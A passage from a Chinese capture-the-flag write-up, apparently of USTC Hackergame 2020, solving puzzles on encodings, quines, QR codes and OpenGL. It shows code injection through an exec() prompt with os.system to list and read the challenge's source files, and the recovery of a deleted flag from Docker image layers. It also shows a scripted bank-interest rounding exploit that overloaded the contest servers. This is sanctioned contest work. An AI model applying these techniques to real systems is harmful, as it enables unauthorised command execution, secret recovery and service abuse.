<code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>...... <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>......</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/21.png\" width=\"1423\" height=\"781\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/22.png\" width=\"800\" height=\"440\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/23.png\" width=\"800\" height=\"440\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/24.png\" width=\"1067\" height=\"586\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>......</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/26.png\" width=\"919\" height=\"936\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>......</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>......</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span 